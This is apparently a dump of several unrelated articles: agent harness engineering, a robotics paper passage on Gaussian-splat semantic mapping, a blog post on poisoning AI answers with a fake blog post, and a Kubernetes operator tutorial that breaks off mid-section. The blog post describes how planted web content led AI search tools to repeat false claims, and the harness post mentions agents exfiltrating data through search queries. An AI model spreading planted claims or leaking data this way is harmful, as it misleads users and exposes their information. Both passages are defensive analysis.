feature</li><li>Principle of least privilege: The agent should have access to exactly what it needs for the current task</li><li>Audit logging: Every tool invocation should be logged for compliance and forensics</li><li>Input/output filtering: Sensitive data in context windows requires handling at the harness level</li><li>Egress controls: A manipulated agent could use legitimate tool calls to exfiltrate data — for example, encoding sensitive context into web search query parameters. Egress monitoring and content inspection on tool inputs are necessary</li><li>Secret management: API keys and credentials required by tools must be injected at the harness level, never exposed in the context window where they could leak through model outputs</li><li>Data governance: When using filesystem-as-memory patterns, apply retention policies and data classification. Agent-written files may contain PII, proprietary data, or intermediate reasoning that requires the same governance as any other data store</li></ul><h2>8. Where My Assumptions Broke</h2><p>What I found: The Vercel case study directly contradicts this. 15 specialized tools produced 80% accuracy. 2 general-purpose tools produced 100%. The model is not constrained by tool availability — it is constrained by tool complexity. Each additional tool increases the decision space and the probability of misrouting.</p><h3>Assumption 2: “Context windows are big enough now”</h3><p>What I found: Even 200k+ token windows degrade under production workloads. Manus’s 50-tool-call sessions generate enough intermediate content to drown the signal. The “Lost in the Middle” research [10] and Needle-in-a-Haystack evaluations [11] confirm this is not just anecdotal. Context window size is necessary but not sufficient — what matters is context&nbsp;, which is a harness responsibility.</p><h3>Assumption 3: “The Bitter Lesson means you should not build infrastructure”</h3><p>What I found: This is a misreading of Sutton’s argument. The Bitter Lesson says&nbsp;<em>general methods that scale with compute win</em>. It does not say&nbsp;<em>do nothing and wait for better models</em>. A good harness is itself a general method — it manages context, recovers from errors, and persists state in ways that scale with model capability. The key is that the harness should get&nbsp;&nbsp;as models improve, not more complex. Build infrastructure that can be progressively deleted.</p><p>What I found: APEX-Agents exposed this comprehensively. Models scoring 90%+ on traditional benchmarks achieved 24% on professional tasks. The gap is not intelligence — it is execution infrastructure. Benchmarks that test isolated reasoning tell you about the engine. Production tells you about the car.</p><h2>9. Was My Hypothesis Correct?</h2><p>Verdict: Correct, with one important qualification.</p><p>For any production agent system where the underlying model meets a capability floor — roughly, a model that can reliably follow multi-step instructions, use tools via structured function calling, and recover from single-step errors (GPT-4-class and above; operationally, you can test this by running your agent on 10 representative tasks and checking whether failures are reasoning errors or orchestration errors):</p><ul><li>Harness engineering yields higher marginal returns than model selection</li><li>Simplifying the harness improves outcomes more often than adding complexity</li><li>Context management, error recovery, and state persistence are the primary failure points, not model reasoning</li><li>The Vercel (80% to 100%), Manus (iterative simplification), and APEX-Agents (~24% despite high benchmark scores) data all support this</li></ul><p>Below a model capability threshold, no harness compensates for insufficient reasoning. You cannot harness-engineer GPT-3.5 into solving APEX-Agents consulting tasks. The harness&nbsp;&nbsp;model capability — it does not&nbsp;&nbsp;it.</p><p>Also, for tasks that are purely reasoning-bound (mathematical proofs, novel algorithm design), model capability dominates. The harness thesis applies most strongly to long-horizon, tool-using, multi-step execution tasks — which is exactly the category where agents are being deployed in production.</p><ol><li>Run the Vercel experiment on your own system. Strip your agent to bash + file access. Run your eval suite. If performance improves, your specialized tools were net-negative. If it drops, your task genuinely requires structured interfaces.</li><li>Add a progress file. Have your agent maintain a persistent todo list that it reads at the start of each action and writes to at the end. This is the simplest possible state management, and both Manus and Claude Code use variants of it.</li><li>Measure your context budget. Instrument your agent to track tokens consumed per task. Set a budget. When you hit it, you have a harness problem, not a model problem.</li><li>Build for deletion. Every piece of harness logic should have an expiration date. If the next model can handle something without your scaffolding, delete the scaffolding.</li><li>Adopt MCP for tool interfaces. Anthropic’s Model Context Protocol [13] is becoming a de facto standard for connecting agents to external tools. Clean tool interfaces are cheaper to maintain than custom integrations.</li></ol><p>2025 was the year of agents. 2026 is the year of harnesses.</p><p>If you think Opus is the best coding model right now, notice that it behaves differently in Claude Code versus Cursor versus the API with a custom harness. The model is the same. The harness changes everything.</p><p>The biggest AI companies are all telling you this. OpenAI published “Harness Engineering.” Anthropic published guides on effective harnesses. Manus published their context engineering lessons (and Meta reportedly paid ~$2 billion for the result [9][19]). The evidence is not subtle.</p><p>Choose your harness carefully — whether you are using an agent or building one. The model will change every few months. The harness is what makes it work.</p>",

      "content": "<p>Early robotic scene mapping research focused on the development of the core competencies in the metric [20], [21], [22] and topological [23], [24] knowledge spaces, extensively centered around the question of map and knowledge representation. For successful task execution, data-rich 3D scene representation and self-localization are critical, enabled by Simultaneous Localization and Mapping (SLAM) algorithms [25], [26], [27]. 3D spatial maps have traditionally been represented by voxel grids, points or surfels, and more recently, neural radiance fields [28], [29]. Each of these approaches come with their own limitations. The accuracy and expressiveness of occupancy and voxel grids are resolution-bounded due to quantization. Points and surfels are discontinuous when rendered, making it challenging to supervise features in a continuous manner. Recent SLAM methods adopting a neural radiance field representation such as NICE-SLAM [30] and NeRF-SLAM [31] are constrained by their implicit representation making it difficult to update geometry over time.</p><p>\\\n<em>B. Semantic Scene Mapping for Robotics</em></p><p>Semantic grounding, particularly in 3D representations, is a longstanding problem [32] to integrate semantic knowledge of objects and the surrounding environment into a mapped scene. The first definition of semantic mapping for robotics is provided by Nuchter, ¨ et al. as a spatial map, 2D or 3D, augmented by information about entities, i.e., objects, functionalities, or events located in space [33]. An early work proposes concurrent object identification and localization using a supervised hierarchical neural network classifier on image color histogram feature vectors [34]. However, because these approaches rely on supervised datasets [35], [36], they work only on a closed set of vocabularies and do not generalize to open-ended semantic queries. More recent works have focused on using large visionlanguage models to support open-vocabulary queries. This includes both 2D [37], [38], [39] and 3D, such as VL-Maps [8] and CLIP-fields [7], which assigns a CLIP feature to every point in the 3D scene. This can be used for setting navigation goals with natural language queries. OpenScene [14] ensembles open-vocabulary feature encoders and 3D point networks to form a per-point feature-vector allowing natural language querying on pointclouds. ConceptFusion [40] develops 3D open-set multimodal mapping by projecting CLIP [41] and pixel aligned features into 3D points, and additionally fuse other modalities such as audio into the scene representation. ConceptGraphs [42] model spatial relationships as well as the semantic objects in the scene to reason over spatial and semantic concepts.</p><p>\\\nSemantic fields have been applied not only to scene-level understanding for mobile robots but also to manipulation. In these settings, NeRFs [2] have been a popular 3D representation, following from Distilled Feature Fields [9], Neural Feature Fusion Fields [10], and Language Embedded Radiance Fields (LERFs) [1]. These works learn an semantic field in addition to the color field. LERF supports a scaleconditioned feature field, which takes in an extra scalar as input to facilitate feature encodings at multiple scene scales. For manipulation, the feature fields have been shown to facilitate learning from few-shot demonstrations [4], policy learning [3], zero-shot trajectory generation [43], and taskoriented grasping [5]. LERF-TOGO’s [5] zero-shot task-oriented grasping performance is fully based on LERF, as LERF’s multi-scale semantics allow for both object- and part-level understanding. This property is also valuable in scene-level settings, where a human may specify a collection of objects, e.g., utensils. LEGS maintains this multi-scale understanding, while speeding up training and querying time, by using Gaussian Splats [16] which have a significantly faster render time.</p><p>\\\n</p><p>3D Gaussian Splatting (3DGS) originated in 2023 [16] to model a scene as an explicit collection of 3D Gaussians. Each Gaussian is described by its position vector µ, covariance matrix Σ, and an opacity parameter α, creating a representation that is both succinct and adaptable for static environments. The choice of 3D Gaussians over traditional point clouds is strategic; their inherent differentiability and the ease with which they can be rasterized into 2D splats enable accelerated α-blending during rendering. By avoiding volumetric ray casting employed by Neural Radiance Fields (NeRFs), Gaussian Splatting has a substantial speed advantage and can support real-time rendering capabilities. Soon after its release, 3DGS has been applied to mapping [44], semantic mapping [45], navigation [46], and semantic fields [17], [18]. 3DGS’s fast rendering time speeds up optimization, making it suitable for integrating visual SLAM and natural language queries for 3D semantic fields. 3DGS has also been demonstrated in both indoor datasets [47], [48], [49], and outdoor driving scenes with multiple cameras where all sensor data is collected before 3DGS training.</p><p>Other work in 3D Gaussian Splatting has focused on embedding language features, and separately, training online. Learning semantic features for Gaussians have taken either one of two approaches: calculating it on-the-fly by querying a network or maintaining multi-dimensional features for each Gaussian. FMGS [17] uses multi-resolution hash encodings [19] optimized with a render-time loss to combine CLIP features with a map of 3D Gaussians. LEGS similarly</p><p>Fig. 2: LEGS System Integration For LEGS, we use a Fetch robot with a custom multicamera configuration where a Realsense D455 is facing forward while 2 Zed cameras face the left and right sides respectively. The left Zed image stream is inputted into DROID-SLAM to compute pose estimates for the left camera, and the corresponding extrinsics are used to compute the pose estimates for the other Zed camera and D455. These image-poses are then used for concurrent Gaussian splat and CLIP training online. From there, the Gaussian splat can be queried for an object (ex. “First Aid Kit”), and the corresponding relevancy field will be computed to localize the desired object.</p><p>\\\nutilizes a hash encoding for its feature field, however it includes scale-conditioning as opposed to averaging CLIP across scales, retaining finer-grained language understanding. On the other hand, LangSplat [18] embeds language in 3DGS by training a scene-specific autoencoder to map between CLIP embeddings and a lower-dimensional latent feature associated with each 3D gaussian. Like traditional radiance field methods, LangSplat assumes poses are corresponded with all scene images prior to 3DGS training as it requires training a VAE over all images of a scene before starting its 3D optimization. However, for robotic systems, it is often desirable to develop 3D semantic understanding online as the robot explores new and previously unseen large-scale environments. SplaTAM [44] optimizes both camera pose and the 3D Gaussian map simultaneously for single-camera setups. However, having multiple cameras and viewpoints can enhance efficient environment data collection. Additionally, SplaTAM lacks semantic features, which is important for identifying and interacting with objects in a 3D scene. To our knowledge, LEGS is the first system that integrates the advantages of both online 3DGS training and language-aligned feature supervision into Gaussian splats for large-scale scene understanding.</p><ol><li>Thomas Kollar&nbsp;Ken Goldberg</li></ol><p>:::info\nThis paper is  under CC by 4.0 Deed (Attribution 4.0 International) license.</p>",

      "content": "<p>Last week, BBC journalist Thomas Germain <a href=\"https://www.bbc.com/future/article/20260218-i-hacked-chatgpt-and-googles-ai-and-it-only-took-20-minutes\">wrote</a> a fake blog post claiming he was the world's greatest hot-dog-eating tech journalist. Within 24 hours, ChatGPT and Google were repeating it as fact.</p><p>Claude, made by Anthropic, wasn't fooled.</p><p>One AI out of three caught the lie. The entire industry treated that as an interesting footnote. An engineer would call it the most important finding in the article.</p><h2>Two Inspectors Approved a Defective Part</h2><p>I am 75 years old. I spent fifty years in industrial engineering -- manufacturing plants, quality systems, production lines. When I read Germain's piece, I didn't see an alarming expose about broken AI. I saw a quality inspection where two out of three inspectors approved a defective part, and everybody wrote about the defect instead of the inspector who caught it.</p><p>In manufacturing, when one inspector catches what two miss, you don't write a panicked article about how inspection is broken. You redesign the system so the catch becomes automatic.</p><p>That redesign has a name. It's called redundant inspection. And it's exactly what multi-engine AI consensus does.</p><h2>What Germain Actually Proved</h2><p>Germain's hack wasn't sophisticated. He wrote a single blog post full of lies on his personal website. No technical exploits. No prompt injection. No code. Just words on a page -- and two of the world's leading AI systems swallowed them whole.</p><p>His article focuses on how easy it is to poison AI outputs. True and worth knowing. But it buries the bigger story: each system failed because it relied on a single model evaluating a single source with no cross-reference.</p><p>Claude caught the lie. ChatGPT didn't. Google didn't. If you had asked all three and compared, the disagreement alone would have been a flag. Two say yes, one says no -- that's not ambiguity. That's a quality signal. That's exactly what inspection systems are designed to surface.</p><h2>The Danger Buried at Paragraph 19</h2><p>The hot dogs are funny. What isn't funny is buried deeper in the article: people are using the same technique to manipulate AI answers about cannabis safety, hair transplant clinics, and gold investment companies. One example had Google's AI repeating a company's false claim that its product \"is free from side effects and therefore safe in every respect.\"</p><p>That's not a prank. That's a health risk delivered with the authority of Google's brand.</p><p>The defence the AI companies offered? Users were told the tools \"can make mistakes.\" Google noted that the manipulated searches were \"extremely uncommon.\"</p><p>Imagine a car manufacturer saying \"our brakes can make mistakes\" and \"this only happens on roads people rarely drive on.\" You wouldn't accept that. Neither should you accept it from AI.</p><p>Lily Ray, an SEO strategist quoted in the BBC article, calls this \"a Renaissance for spammers.\" She's right. And the parallel she draws -- that these tricks recall the early 2000s before Google even had a web spam team -- is telling.</p><p>Google didn't solve spam by making individual web pages unspammable. That's impossible. They built systems -- PageRank, link analysis, spam detection -- that cross-referenced signals from multiple sources to surface what was trustworthy.</p><p>The AI industry is trying to make individual models unmanipulable. That's the wrong target. The right target is building systems where manipulation gets caught automatically, by design. Not better guardrails on one model. Better architecture across many.</p><h2>What Consensus Looks Like in Practice</h2><p>I've been building AI-powered systems for eighteen months. Not as a computer scientist -- as an industrial engineer who needed reliable outputs. When I discovered that a single AI model could be confidently wrong, I did what any quality engineer would: I added redundant inspection.</p><p>My platform -- Seekrates AI -- sends every query through multiple AI engines simultaneously. Different architectures. Different training data. Different biases. Then it compares the answers.</p><p>When the models agree, confidence is high. When they disagree, you get the most valuable thing in AI: a flag that says <em>this needs human judgment.</em></p><p>If Germain's hot dog claim had been evaluated this way, Claude would have rejected it. ChatGPT and Google would have accepted it. The system would have flagged the split. A human would have seen that two-thirds agreement on a claim sourced from a single personal blog doesn't meet any reasonable confidence threshold.</p><p>Manipulation caught. Automatically.</p><h2>\"Just Be More Careful\" Isn't Engineering</h2><p>The BBC article ends with sensible advice: check sources, don't take AI at face value. Ray says \"you have to still be a good citizen of the internet and verify things.\"</p><p>She's right. But according to research cited in the same article, people are 58% less likely to click on a source link when an AI Overview appears. The entire design of these products is engineered to make you trust the answer without checking.</p><p>Telling users to verify is like designing a car without seatbelts and telling drivers to be careful. The verification has to be built into the system. The AI has to check itself -- across multiple models, multiple architectures, multiple training sets -- before the answer ever reaches the user.</p><h2>The Pattern Is a Century Old</h2><p>I've run over 3,000 conversations across three AI platforms. I've built production systems with 93-100% first-pass accuracy -- not by finding a better model, but by making models check each other's work.</p><p>The pattern is as old as manufacturing:</p><p>Never trust a single inspection. Build redundancy into the system. Make disagreement visible. When something passes multiple independent checks, trust the process -- because the probability of every inspector being wrong in the same direction, at the same time, is vanishingly small.</p><p>Germain proved that single-model AI is broken. He's right. The fix isn't panic, better disclaimers, or hoping users become more sceptical.</p><p>The fix is what engineers have known for a hundred years: don't trust the inspector. Trust the inspection system.</p><p>One of the inspectors already caught the lie. The system just wasn't there to listen.</p>",

Kubernetes gives you primitives: Pods, Deployments, Services, ConfigMaps. These are general-purpose building blocks. They’re powerful, but they’re  — they don’t understand your application’s operational semantics.</p><p>Consider a PostgreSQL cluster. A skilled DBA knows:</p><ul><li>How to perform a rolling upgrade without downtime</li><li>When and how to promote a standby to primary during a failure</li><li>How to orchestrate backups in a consistent way</li><li>How to resize volumes without data loss</li></ul><p>None of this knowledge lives in native Kubernetes. An  is the mechanism to <em>codify operational expertise</em> into software that runs inside your cluster and manages resources on your behalf.</p><p>The formal definition: An Operator is a  that manages  to automate complex, stateful application lifecycle management.</p><h2>The Conceptual Foundation: Control Theory</h2><p>Every operator is, at its core, an implementation of a <strong>closed-loop control system</strong> — specifically what control engineers call a .</p><p>The three core concepts are:</p><p> — What you declare in your Custom Resource (the  field). This is immutable intent.</p><p> — What’s actually running in the cluster right now (the  field plus the state of managed child resources).</p><p> — The act of computing the delta between desired and observed state, then taking actions to close that gap.</p><p>Controllers are <em>implemented on top of event streams</em> (watch events from the Kubernetes API), but their reconciliation logic is <strong>level-based, not edge-triggered</strong>. The trigger is event-driven; the behavior is not. Rather than reacting once to a specific event, the controller always asks “is the world in the state I want?” and drives toward that state regardless of how many events fired. This distinction matters enormously for resilience: if you miss an event, the next reconciliation catches it anyway. Contrast this with a purely edge-triggered system where a missed event means a missed action — permanently.</p><h2>Kubernetes API Machinery: The Backbone</h2><p>Before building or understanding operators, you need a solid mental model of how the Kubernetes API server works.</p><p>Every object in Kubernetes is stored in  as a versioned, typed resource. The API server exposes these objects via a RESTful interface. Critically, the API server supports a  mechanism — clients can subscribe to a stream of events for any resource type.</p><p>The watch stream delivers three event types: , , . These are the raw signals your controller eventually acts on, though — as we’ll see — the controller runtime abstracts this considerably.</p><p> are central to the concurrency model. Every object has a  field — an opaque string used for optimistic concurrency control. It is derived from etcd’s internal revision mechanism, but clients must always treat it as opaque: never parse it, compare it numerically, or make assumptions about its format. When you update an object, you must send the current  to guarantee a compare-and-swap, preventing lost updates in concurrent environments.</p><h2>Custom Resource Definitions</h2><p>CRDs are how you extend the Kubernetes API. When you apply a CRD, the API server dynamically registers new API endpoints, enables storage in etcd, and starts serving your custom resources as first-class API objects.</p><p>A CRD has several important structural components:</p><pre><code>apiVersion: apiextensions.k8s.io/v1\nkind: CustomResourceDefinition\nmetadata:\n  name: databases.mycompany.io\nspec:\n  group: mycompany.io\n  names:\n    kind: Database\n    plural: databases\n    singular: database\n    shortNames: [\"db\"]\n  scope: Namespaced\n  versions:\n    - name: v1alpha1\n      served: true\n      storage: true\n      schema:\n        openAPIV3Schema:\n          # Structural schema for validation\n      subresources:\n        status: {}           # Enables /status subresource\n        scale:               # Optional: enables /scale subresource\n          specReplicasPath: .spec.replicas\n          statusReplicasPath: .status.replicas\n      additionalPrinterColumns:\n        - name: Phase\n          type: string\n          jsonPath: .status.phase\n</code></pre><p> subresource deserves special attention. When enabled,  and  become separately updatable — meaning only the controller should write to , and users should only write to . This enforces a clean separation of intent vs. observation.</p><p> is mandatory since  (Kubernetes 1.16+). Non-structural schemas are rejected by the API server. The  field defines the shape of your resource and enables server-side validation — every field must be described. This prevents garbage data from entering your system.</p><h2>The Controller Runtime: Inside the Engine</h2><p>The  library (used by both Kubebuilder and Operator SDK) provides the scaffolding that most operators are built on. Let’s dissect what it gives you.</p><p> is the top-level orchestrator. It:</p><ul><li>Manages a shared  (backed by informers) for all resource types your controllers care about</li><li>Provides a  that reads from the local cache and writes directly to the API server</li><li>Runs all controllers in goroutines</li><li>Exposes health check and metrics endpoints</li></ul><p> is the performance secret. Rather than every reconciliation hitting the API server, reads go to a local in-memory store that is kept in sync via informers. This reduces API server load dramatically and makes your operator fast.</p><p> has two personalities:</p><ul><li> (cache-backed): Fast, eventually consistent. Used for  and  operations during reconciliation. If you need strong consistency at a specific checkpoint, you can bypass the cache by constructing an uncached client — but do so sparingly, as it adds latency and API server load.</li><li> (direct to API): Used for , , , , and . These always go directly to the API server, never through the cache.</li></ul><p>This is where things get really interesting from an internals perspective. The  is the heart of the watch machinery.</p><p>The  does the heavy lifting: it first performs a  to establish the initial state, then starts a long-lived . If the watch connection drops (network blip, API server restart), the reflector automatically reconnects and re-lists if necessary.</p><p>The  queue is a clever data structure that deduplicates events for the same object. If an object is modified 10 times before the controller gets around to processing it, they’re collapsed. This is the first layer of the “level-triggered” behavior.</p><p>The  (a thread-safe store with indexes) is what  and  read from. It’s always slightly behind the API server (eventual consistency), but that’s acceptable because your reconciler should be idempotent anyway.</p><p> are typed wrappers over the cache that let you query by namespace or label selector without hitting the network.</p><h2>The Reconciliation Loop in Depth</h2><p>Here’s the full picture of what happens from a watch event to a completed reconciliation:</p><p>A few nuances that trip people up:</p><p><strong>The key is a namespace/name pair, not an object.</strong> When your reconciler is called, you only get the namespace and name. You must re-fetch the current state of the object from the cache. Never trust stale data passed in — always re-read at the top of your reconcile function.</p><p><strong>Reconcile should be idempotent.</strong> It will be called multiple times for the same state. If you create a resource, check if it already exists first. If you apply a configuration, make it declarative. A reconcile that is accidentally destructive when called twice is a ticking time bomb.</p><p> Returning an  causes the item to be requeued with exponential backoff (respecting the rate limiter). Returning <code>ctrl.Result{Requeue: true}</code> or <code>ctrl.Result{RequeueAfter: duration}</code> requeues without registering an error (no backoff increment). Use the former for actual errors, the latter for polling scenarios.</p><h2>Work Queues and Rate Limiting</h2><p>The work queue deserves its own section because it’s where many operator performance issues originate.</p><p>The work queue has a built-in  guarantee: if the same namespace/name is already in the queue, adding it again is a no-op. This means a burst of 100 events for the same object results in exactly one reconciliation.</p><p>The  ensures that while an item is being reconciled, any new events for that same item are queued but not dispatched until the current reconciliation completes. This prevents concurrent reconciliations for the same object.</p><p> in controller-runtime compose two strategies:</p><p>The <em>ItemExponentialFailureRateLimiter</em> tracks per-item failure counts and applies backoff:  up to a maximum. This prevents a persistently failing object from hammering the API server.</p><p>The  is a global token bucket that caps overall reconciliation throughput. This protects the API server from a thundering herd when many objects need reconciliation simultaneously (e.g., after an operator restart).</p><p>The default controller-runtime rate limiter combines per-item exponential backoff (base ~5ms, max ~1000s) with a global token bucket (~10 QPS, burst ~100). These defaults can vary across controller-runtime versions and are not guaranteed API contracts — always verify against your version’s source. In high-scale environments, you’ll almost certainly want to tune them.</p><h2>Watches, Events, and Predicates</h2><p>A controller needs to know which objects to watch. The  builder in controller-runtime lets you express complex watch topologies.</p><p> is the most common pattern: when a child resource changes (e.g., a Pod owned by your operator’s StatefulSet), find the owner reference chain and enqueue the root owner. This lets the parent controller react to child state changes.</p><p> (formerly <code>EnqueueRequestsFromMapFunc</code>) is a powerful escape hatch. Given any object event, you provide a function that maps it to zero or more reconcile requests. Use this for non-ownership relationships — e.g., when a shared Secret changes, requeue all operators that reference it.</p><p> filter events before they hit the queue. This is a critical optimization that’s often overlooked:</p><pre><code>// Only reconcile when spec changes, not on every status update\nctrl.NewControllerManagedBy(mgr).\n    For(&amp;myv1.Database{},\n        builder.WithPredicates(predicate.GenerationChangedPredicate{})).\n    Complete(r)\n</code></pre><p><code>GenerationChangedPredicate</code> is particularly valuable — it only triggers reconciliation when  increments (which only happens on spec changes), ignoring pure status updates. Without this, every status write your controller does triggers another reconciliation, creating a tight loop.</p><h2>Ownership, Finalizers, and Garbage Collection</h2><p>This triad is where operator bugs tend to cluster. Let’s be precise.</p><p> establish the parent-child relationship for garbage collection:</p><p> — what happens step by step when a user deletes an object with a finalizer:</p><p>Owner references tell the Kubernetes garbage collector that child objects should be deleted when the parent is deleted. Always set owner references on resources you create — without them, orphaned resources accumulate in the cluster.</p><pre><code>ctrl.SetControllerReference(database, statefulSet, r.Scheme)\n</code></pre><p>This sets the child’s  to point to the parent, with  and .</p><p> are strings in  that prevent an object from being deleted until all finalizers are removed. When a user deletes an object with finalizers, Kubernetes sets <code>metadata.deletionTimestamp</code> but doesn’t remove the object. Your controller must detect this, do cleanup work, remove its finalizer, and then update the object — at which point Kubernetes deletes it.</p><p>Common finalizer pattern:</p><pre><code>const myFinalizer = \"mycompany.io/database-finalizer\"\n\nfunc (r *Reconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) {\n    db := &amp;myv1.Database{}\n    if err := r.Get(ctx, req.NamespacedName, db); err != nil {\n        return ctrl.Result{}, client.IgnoreNotFound(err)\n    }\n\n    if !db.DeletionTimestamp.IsZero() {\n        // Object is being deleted\n        if controllerutil.ContainsFinalizer(db, myFinalizer) {\n            if err := r.runCleanup(ctx, db); err != nil {\n                return ctrl.Result{}, err\n            }\n            controllerutil.RemoveFinalizer(db, myFinalizer)\n            return ctrl.Result{}, r.Update(ctx, db)\n        }\n        return ctrl.Result{}, nil\n    }\n\n    // Add finalizer if not present\n    if !controllerutil.ContainsFinalizer(db, myFinalizer) {\n        controllerutil.AddFinalizer(db, myFinalizer)\n        return ctrl.Result{}, r.Update(ctx, db)\n    }\n\n    // Normal reconciliation...\n}\n</code></pre><p>: Finalizer logic must be robust and eventually complete. A finalizer that never removes itself will prevent the object from being garbage collected forever. Always provide a way to force-remove the finalizer in operational runbooks.</p><h2>Status Subresource and Conditions</h2><p>Your operator’s primary communication channel with users (and other systems) is the  field. Get this right.</p><p>Always use the  pattern for status. It’s the Kubernetes-idiomatic way to communicate multi-dimensional state. The example below uses condition types modeled after the common Kubernetes Deployment pattern — adapt the types to your domain:</p><pre><code>status:\n  phase: Running\n  observedGeneration: 5    # which spec generation this status reflects\n  conditions:\n    - type: Ready\n      status: \"True\"\n      lastTransitionTime: \"2024-01-15T10:00:00Z\"\n      reason: AllReplicasReady\n      message: \"3/3 replicas are ready\"\n    - type: Progressing\n      status: \"False\"\n      lastTransitionTime: \"2024-01-15T10:01:00Z\"\n      reason: ReplicaSetAvailable\n      message: \"Rollout complete\"\n    - type: Available\n      status: \"True\"\n      lastTransitionTime: \"2024-01-14T08:00:00Z\"\n      reason: MinimumReplicasAvailable\n      message: \"Deployment has minimum availability\"\n</code></pre><p> is critical and frequently missed. It tells observers which version of the spec this status corresponds to. Without it, you can’t tell if  means “running the spec you just applied” or “running an older spec while the new one is being processed.”</p><p>Always update status with <code>r.Status().Update(ctx, obj)</code> not . The status subresource has a separate endpoint and a separate RBAC policy. The main update endpoint ignores status changes; the status endpoint ignores spec changes.</p><h2>Generation vs ObservedGeneration: A Deep Dive</h2><p>This is one of the most misunderstood mechanics in operator development, yet it’s fundamental to building correct status reporting. Let’s be precise.</p><p> is a monotonically incrementing integer managed entirely by the API server. It increments <strong>only when the spec changes</strong> — status updates, label changes, and annotation changes do not increment it. This is why <code>GenerationChangedPredicate</code> works: it filters out the noise.</p><p><code>status.observedGeneration</code> is a field your controller writes to  after completing a reconciliation. It should be set to the  value of the object you just reconciled.</p><p>The pattern lets any observer — including , GitOps controllers, and your own tooling — determine whether the controller has finished processing the latest spec without any out-of-band signaling:</p><pre><code>func (r *Reconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) {\n    db := &amp;myv1.Database{}\n    if err := r.Get(ctx, req.NamespacedName, db); err != nil {\n        return ctrl.Result{}, client.IgnoreNotFound(err)\n    }\n\n    // ... reconcile logic ...\n\n    // At the end: stamp observedGeneration\n    db.Status.ObservedGeneration = db.Generation\n    db.Status.Phase = \"Running\"\n    return ctrl.Result{}, r.Status().Update(ctx, db)\n}\n</code></pre><p>Without , a  is ambiguous — it could mean “running the spec you just applied 30 seconds ago” or “running an old spec that’s three versions behind.” With it, observers have a precise, reliable signal.</p><h2>Concurrency, MaxConcurrentReconciles, and Cache Scoping</h2><p>By default, controller-runtime runs <strong>one reconciler goroutine per controller</strong>. For many operators this is fine, but for operators managing hundreds or thousands of independent custom resources, this is a significant throughput bottleneck. Enter :</p><pre><code>ctrl.NewControllerManagedBy(mgr).\n    For(&amp;myv1.Database{}).\n    WithOptions(controller.Options{\n        MaxConcurrentReconciles: 10,\n    }).\n    Complete(r)\n</code></pre><p>This allows up to 10 reconciler goroutines to run in parallel for different objects. A few important points:</p><p><strong>The work queue guarantees per-object serialization.</strong> Even with <code>MaxConcurrentReconciles: 10</code>, the same  key will never be dispatched to two goroutines simultaneously. You get concurrency across different objects, not within a single object’s reconciliation chain.</p><p><strong>Your reconciler must be goroutine-safe.</strong> Any shared state (metrics counters, caches, client connections) must be safe for concurrent access. The controller-runtime client is safe. Custom state you add to the reconciler struct is your responsibility.</p><p><strong>Rate limiting still applies globally.</strong> High  combined with a tight rate limiter creates goroutines waiting on the rate limiter. Tune both together.</p><p>A good starting heuristic: set  to roughly the number of objects you expect divided by the average reconcile latency in seconds. For 1000 objects reconciling in ~500ms each, <code>MaxConcurrentReconciles: 5</code> gives you comfortable throughput headroom.</p><h3>Cache Scoping for Large Clusters</h3><p>By default, the controller-runtime cache watches all namespaces. In large multi-tenant clusters this can mean caching thousands of objects your operator doesn’t care about. Cache scoping is the solution:</p><pre><code>mgr, err := ctrl.NewManager(cfg, ctrl.Options{\n    Cache: cache.Options{\n        // Only cache objects in specific namespaces\n        DefaultNamespaces: map[string]cache.Config{\n            \"tenant-a\": {},\n            \"tenant-b\": {},\n        },\n    },\n})\n</code></pre><p> is another powerful tool. If your reconciler frequently lists objects filtered by a custom field, add an index to the cache:</p><pre><code>// Index Databases by their referenced Secret name\nif err := mgr.GetFieldIndexer().IndexField(\n    ctx,\n    &amp;myv1.Database{},\n    \".spec.credentialsSecret\",\n    func(obj client.Object) []string {\n        db := obj.(*myv1.Database)\n        return []string{db.Spec.CredentialsSecret}\n    },\n); err != nil {\n    return err\n}\n\n// Now you can efficiently list all DBs referencing a secret\ndbList := &amp;myv1.DatabaseList{}\nr.List(ctx, dbList, client.MatchingFields{\".spec.credentialsSecret\": secretName})\n</code></pre><p>Without an index, this  does a full cache scan. With it, it’s an O(1) lookup. At scale, this is the difference between a 1ms and 200ms reconciliation.</p><h3>Optimistic Locking and Conflict Retries</h3><p>API server conflicts () are a normal part of operating at scale. When your reconciler reads an object, modifies it, and writes it back — and something else has modified it in between — you get a conflict. The correct response is to re-read and retry:</p><pre><code>import \"k8s.io/client-go/util/retry\"\n\nerr := retry.RetryOnConflict(retry.DefaultRetry, func() error {\n    // Re-fetch to get the latest resourceVersion\n    if err := r.Get(ctx, req.NamespacedName, db); err != nil {\n        return err\n    }\n    // Apply your changes to the freshly-fetched object\n    db.Status.Phase = computedPhase\n    return r.Status().Update(ctx, db)\n})\n</code></pre><p> uses exponential backoff (5 retries, 10ms base, 1.0 jitter). For status updates this is usually sufficient. For spec updates, prefer server-side apply which handles conflicts at the field ownership level rather than requiring a full re-read/retry.</p><p>In production, you run multiple replicas of your operator for high availability. But you don’t want multiple replicas simultaneously reconciling the same objects — that leads to conflicts and thrashing. Leader election solves this.</p><p>Controller-runtime uses a  object in the cluster as the distributed lock. The leader holds the lease by periodically renewing it. If the leader fails to renew before the lease expires, another replica acquires it.</p><p>Configuration in controller-runtime:</p><pre><code>mgr, err := ctrl.NewManager(cfg, ctrl.Options{\n    LeaderElection:          true,\n    LeaderElectionID:        \"my-operator-leader\",\n    LeaderElectionNamespace: \"my-operator-system\",\n    LeaseDuration:           &amp;leaseDuration,  // default 15s\n    RenewDeadline:           &amp;renewDeadline,  // default 10s\n    RetryPeriod:             &amp;retryPeriod,    // default 2s\n})\n</code></pre><p><strong>Standby replicas still run the cache</strong> — they maintain informers and local caches, but they don’t start the controllers. This means failover is fast (no cold start for the informer sync) because the new leader already has a warm cache.</p><p>: Leader election  the likelihood of concurrent reconciliations, but it does not eliminate it entirely. During the lease expiry window, a brief overlap is possible where both the old and new leader are active. Controllers must still be written to tolerate conflicts and retries. Never assume strict single-threaded execution at the cluster level — your reconciler must be safe to run concurrently.</p><p>: Leader election adds latency to recovery. With , a leader failure can cause up to 15 seconds of no-reconciliation. Tune this based on your operator’s latency requirements.</p><h2>Webhooks: Admission and Conversion</h2><p>Webhooks are the mechanism to inject logic into the API server’s request pipeline.</p><p><strong>Defaulting Webhooks (MutatingAdmissionWebhook)</strong> run before storage and let you inject default field values. This is essential for forward compatibility — when you add a new required field to v2 of your CRD, a defaulting webhook can populate it for resources created without it.</p><p><strong>Validating Webhooks 